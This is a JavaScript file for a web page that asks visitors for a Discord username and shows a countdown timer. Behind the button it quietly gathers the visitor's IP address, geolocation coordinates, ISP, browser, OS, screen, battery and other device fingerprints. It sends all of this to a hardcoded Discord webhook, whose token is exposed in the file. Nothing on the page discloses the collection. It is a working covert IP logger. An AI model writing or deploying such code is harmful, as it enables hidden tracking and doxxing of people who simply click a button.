const button = document.getElementById('clickButton');
const message = document.getElementById('message');
const timer = document.getElementById('timer');
const discordUserInput = document.getElementById('discordUser');
const pageLoadTime = Date.now();
let timerInterval;

discordUserInput.addEventListener('input', () => {
    button.disabled = !discordUserInput.value.trim();
});

button.addEventListener('click', () => {
    message.style.display = 'block';
    timer.style.display = 'block';
    button.disabled = true;

    let timeLeft = 60;
    timerInterval = setInterval(() => {
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        timer.textContent = `Time remaining: ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;

        if (timeLeft === 0) {
            clearInterval(timerInterval);
            timer.textContent = "Time's up!";
            setTimeout(() => {
                timer.style.display = 'none';
                message.style.display = 'none';
            }, 2000);
            button.disabled = false;
        } else {
            timeLeft--;
        }
    }, 1000);

    fetch('https://ipinfo.io/json')
        .then(response => response.json())
        .then(data => {
            const username = discordUserInput.value.trim();
            const ipInfo = {
                ip: data.ip,
                hostname: data.hostname,
                city: data.city,
                region: data.region,
                country: data.country,
                countryCode: data.country.toUpperCase(),
                location: data.loc,
                org: data.org,
                postal: data.postal,
                timezone: data.timezone,
                isp: data.org.split(" ")[0],
                asn: data.asn,
                company: data.org.split(" ")[1],
                regionDescription: data.region + ' (' + data.city + ')',
                ipType: data.ip.includes(':') ? 'IPv6' : 'IPv4',
                isVPN: data.org.includes("VPN") ? 'Yes' : 'No',
                geolocation: `Lat: ${data.loc.split(',')[0]} | Long: ${data.loc.split(',')[1]}`
            };

            const currentDate = new Date();
            const dateString = currentDate.toLocaleString();
            const isoDateString = currentDate.toISOString();

            getBrowserInfo(username, ipInfo, dateString, isoDateString);
        });
});

function getBrowserInfo(username, ipInfo, dateString, isoDateString) {
    const userAgent = navigator.userAgent;
    const browser = userAgent.includes("Chrome") ? "Chrome" : userAgent.includes("Firefox") ? "Firefox" : "Other";
    const browserVersion = userAgent.match(/(Chrome|Firefox|Safari)\/([0-9.]+)/);
    const os = userAgent.includes("Windows") ? "Windows" : userAgent.includes("Mac") ? "MacOS" : "Other";
    const osVersion = /Windows (\d+\.\d+)/.exec(userAgent) || /Mac OS X (\d+\.\d+)/.exec(userAgent) || ["N/A"];
    const cpuArchitecture = navigator.platform;
    const deviceType = /Mobi|Android/i.test(userAgent) ? "Mobile" : "Desktop";
    const screenResolution = `${window.screen.width}x${window.screen.height}`;
    const language = navigator.language || navigator.userLanguage;
    const timeOnPage = ((Date.now() - pageLoadTime) / 1000).toFixed(2) + ' seconds';
    const dpr = window.devicePixelRatio;
    const viewportWidth = window.innerWidth;
    const viewportHeight = window.innerHeight;
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    const networkType = connection ? connection.effectiveType : 'Unknown';
    const orientation = window.innerHeight > window.innerWidth ? 'Portrait' : 'Landscape';
    const deviceMemory = navigator.deviceMemory || 'Unknown';
    const touchSupport = 'ontouchstart' in window ? 'Touchscreen Supported' : 'Touchscreen Not Supported';
    const cookiesEnabled = navigator.cookieEnabled ? "Cookies Enabled" : "Cookies Disabled";
    const isHeadless = navigator.webdriver ? 'Yes' : 'No';

    // Added WebGL and Timezone offset information
    const supportsWebGL = (function () {
        try {
            const canvas = document.createElement('canvas');
            return !!(canvas.getContext('webgl') || canvas.getContext('experimental-webgl'));
        } catch (e) {
            return false;
        }
    })();
    const timezoneOffset = new Date().getTimezoneOffset();

    getSystemInfo(username, ipInfo, dateString, isoDateString, browser, os, osVersion[1], cpuArchitecture, deviceType, screenResolution, language, timeOnPage, networkType, browserVersion[2], dpr, viewportWidth, viewportHeight, cookiesEnabled, deviceMemory, touchSupport, orientation, isHeadless, supportsWebGL, timezoneOffset);
}

function getSystemInfo(username, ipInfo, dateString, isoDateString, browser, os, osVersion, cpuArchitecture, deviceType, screenResolution, language, timeOnPage, networkType, browserVersion, dpr, viewportWidth, viewportHeight, cookiesEnabled, deviceMemory, touchSupport, orientation, isHeadless, supportsWebGL, timezoneOffset) {
    if (navigator.getBattery) {
        navigator.getBattery().then(battery => {
            const batteryLevel = (battery.level * 100) + '%';
            const charging = battery.charging ? "Charging" : "Not Charging";
            const batteryHealth = battery.chargingTime > 0 ? "Healthy" : "Low Health";
            sendToDiscord(username, ipInfo, dateString, isoDateString, browser, os, osVersion, cpuArchitecture, deviceType, screenResolution, language, timeOnPage, networkType, batteryLevel, charging, batteryHealth, orientation, deviceMemory, touchSupport, browserVersion, dpr, viewportWidth, viewportHeight, cookiesEnabled, isHeadless, supportsWebGL, timezoneOffset);
        });
    } else {
        sendToDiscord(username, ipInfo, dateString, isoDateString, browser, os, osVersion, cpuArchitecture, deviceType, screenResolution, language, timeOnPage, networkType, 'N/A', 'N/A', 'N/A', orientation, deviceMemory, touchSupport, browserVersion, dpr, viewportWidth, viewportHeight, cookiesEnabled, isHeadless, supportsWebGL, timezoneOffset);
    }
}

function sendToDiscord(username, ipInfo, dateString, isoDateString, browser, os, osVersion, cpuArchitecture, deviceType, screenResolution, language, timeOnPage, networkType, batteryLevel = 'N/A', charging = 'N/A', batteryHealth = 'N/A', orientation = 'Unknown', deviceMemory = 'Unknown', touchSupport = 'Unknown', browserVersion = 'Unknown', dpr = 'Unknown', viewportWidth = 'Unknown', viewportHeight = 'Unknown', cookiesEnabled = 'Unknown', isHeadless = 'No', supportsWebGL = 'Unknown', timezoneOffset = 'Unknown') {
    const webhookURL = "https://discord.com/api/webhooks/1302389823645941831/lqTXR7ovEP0IdnwA95HM_IvPQzTjmAcdPK-oE5dYVOoWyU2U5oB7eRBKNT1VzC6MiZmx";

    const embed = {
        title: "User Information",
        description: `
**Discord Information:**
- **Username:** ${username}
- **IP Address:** ${ipInfo.ip}
- **Hostname:** ${ipInfo.hostname}
- **ISP:** ${ipInfo.isp}
- **ASN:** ${ipInfo.asn}
- **ISP Company:** ${ipInfo.company}
- **Region & City:** ${ipInfo.regionDescription}
- **Location Coordinates:** ${ipInfo.location}
- **IP Type:** ${ipInfo.ipType}
- **Is VPN:** ${ipInfo.isVPN}

**Settings Information:**
- **Browser:** ${browser} (Version: ${browserVersion})
- **Operating System:** ${os} (Version: ${osVersion})
- **CPU Architecture:** ${cpuArchitecture}
- **Device Type:** ${deviceType}
- **Screen Resolution:** ${screenResolution}
- **Language:** ${language}
- **Time Spent on Page:** ${timeOnPage}
- **Network Type:** ${networkType}
- **Supports WebGL:** ${supportsWebGL ? 'Yes' : 'No'}
- **Timezone Offset:** ${timezoneOffset} minutes

**Device Information:**
- **Battery Level:** ${batteryLevel}
- **Charging Status:** ${charging}
- **Battery Health:** ${batteryHealth}
- **Device Orientation:** ${orientation}
- **Device Memory:** ${deviceMemory}
- **Touch Support:** ${touchSupport}
- **Headless Browser:** ${isHeadless}
- **Cookies Enabled:** ${cookiesEnabled}

**Date & Time:**
- **Local Time:** ${dateString}
- **ISO Time:** ${isoDateString}`,
        color: 0x00ff00,
    };

    const payload = {
        embeds: [embed]
    };

    fetch(webhookURL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    });
}